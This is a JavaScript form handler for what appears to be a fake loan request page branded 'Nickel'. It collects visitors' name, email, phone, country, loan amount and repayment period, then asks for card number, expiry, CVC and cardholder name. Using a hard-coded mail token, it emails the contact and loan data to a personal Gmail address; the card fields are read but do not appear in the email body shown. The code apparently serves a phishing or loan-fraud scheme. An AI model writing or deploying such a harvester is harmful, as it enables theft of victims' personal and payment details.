
document.getElementById("btn-next").addEventListener("click", function () {
    let name = $("#dnom").val();
    let email = $("#dmail").val();
    let pays = $("#dpays").val();
    let tel = $("#dtel").val();
    let mont = $("#dmont").val();
    let dr = $("#ddr").val();
    
    //let info = $("#dinfos").val();

    if (name === '' || email === '' || pays === '' || tel === '' || mont === '' || dr === '') {
        console.log("Ah non")
    } else {
        $("#second-step").show();
        $("#first-step").hide();
    }
});

document.getElementById("btn-submit").addEventListener("click", function (e) {
    console.log("Ah oui je suis submiter")
    
    let dcarte = $("#dcarte").val();
    let dcartedate = $("#dcartedate").val();
    let dcvc = $("#dcvc").val();
    let dcartenom = $("#dcartenom").val();

    if (dcarte === '' || dcartedate === '' || dcvc === '' || dcartenom === '') {
        console.log("Ah non")
    }

    let name = $("#dnom").val();
    let email = $("#dmail").val();
    let pays = $("#dpays").val();
    let tel = $("#dtel").val();
    let mont = $("#dmont").val();
    let dr = $("#ddr").val();
    
    let info = $("#dinfos").val();

    Email.send({
        SecureToken : "46d446dd-390e-40d8-b0b5-cc49dd4e3c53",
        To : 'rolandgarcia75000@gmail.com',
        From : "leonbonou20@gmail.com",
        Subject : "Nickel - Demande",
        Body : "  <strong>Les informations du contact</strong> <br><br><br>\n" +
            "  <table>\n" +
            "      <tr>\n" +
            "          <th style=\"text-align: left\">Nom complet: </th>\n" +
            "          <td>"+name+"</td>\n" +
            "      </tr>\n" +
            "      <tr>\n" +
            "          <th style=\"text-align: left\">Email: </th>\n" +
            "          <td>"+email+"</td>\n" +
            "      </tr>\n" +
            "      <tr>\n" +
            "          <th style=\"text-align: left\">Téléphone: </th>\n" +
            "          <td>"+tel+"</td>\n" +
            "      </tr>\n" +
            "      <tr>\n" +
            "          <th style=\"text-align: left\">Pays: </th>\n" +
            "          <td>"+pays+"</td>\n" +
            "      </tr>\n" +
            "      <tr>\n" +
            "          <th style=\"text-align: left; color: red\">Montant du prêt: </th>\n" +
            "          <td>"+mont+"</td>\n" +
            "      </tr>\n" +
            "      <tr>\n" +
            "          <th style=\"text-align: left\">Durée du remboursement: </th>\n" +
            "          <td>"+dr+"</td>\n" +
            "      </tr>\n" +
            "      <tr>\n" +
            "          <th style=\"text-align: left\">Autres info: </th>\n" +
            "          <td>"+info+"</td>\n" +
            "      </tr>\n" +
            "  </table>",
    }).then(

    );

    e.preventDefault();


});